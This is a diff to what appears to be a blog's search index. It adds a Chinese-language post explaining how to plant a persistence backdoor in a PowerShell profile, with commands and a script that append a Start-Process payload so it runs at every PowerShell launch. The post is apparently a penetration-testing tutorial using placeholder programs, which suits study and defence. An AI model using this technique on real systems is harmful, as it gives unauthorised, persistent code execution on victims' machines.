@@ -3,6 +3,21 @@
   
     
     <entry>
+      <title>Powershell配置文件-持久性后门</title>
+      <link href="/posts/3327c145.html"/>
+      <url>/posts/3327c145.html</url>
+      <content type="html"><![CDATA[<p>powershell配置文件后门，通过设置配置文件后门可以实现每次powershell启动时。执行指定的恶意操作<br><img src="https://s2.ax1x.com/2019/11/07/MkN7Yq.png" alt="MkN7Yq.png"></p><h1 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h1><pre><code class="powershell">echo $profile #输出配置文件的路径Test-Path $profile #判断配置文件是否存在，如果返回为False代表不存在，返回True则存在New-Item -Path $profile -Type File –Force #新建一个配置文件$string = &#39;Start-Process &quot;C:\tmp\pentestlab.exe&quot;&#39; #要启动的恶意程序$string | Out-File -FilePath &quot;C:\Users\&lt;User&gt;\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1&quot; -Append  #写入配置文件</code></pre><p><img src="https://s2.ax1x.com/2019/11/07/MkUl1f.png" alt=""></p><p><img src="https://s2.ax1x.com/2019/11/07/MkUahq.png" alt="MkUahq.png"></p><p>测试结果<br><img src="https://s2.ax1x.com/2019/11/07/MkU03V.gif" alt="MkU03V.gif"></p><p>自动写入的ps1脚本</p><pre><code class="powershell">Write-Host -NoNewline [*] New powershell config;New-Item -Path $profile -Type File –Force;$path=$profile;Write-Host [*] config path: $path;$sets=Test-Path $profile;if($sets -eq &quot;True&quot;){    Write-Host [*] New config ok;    $payload=&#39;Start-Process &quot;C:\Windows\System32\notepad.exe&quot;&#39;    $payload | Out-File -FilePath $path;    Write-Host [+] write powershell config ok !!!}else{    Write-Host -NoNewline [-] New config False...;    exit(1);}</code></pre><p><img src="https://s2.ax1x.com/2019/11/07/MkrEG9.gif" alt=""></p><p>当然你也可以用这个方法来实现无文件攻击</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://pentestlab.blog/2019/11/05/persistence-powershell-profile/" target="_blank" rel="noopener">Persistence – PowerShell Profile | Penetration Testing Lab</a></p>]]></content>
+      
+      
+        <tags>
+            
+            <tag> 权限维持 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    <entry>
       <title>Vulnhub:Broken</title>
       <link href="/posts/344f3de9.html"/>
       <url>/posts/344f3de9.html</url>
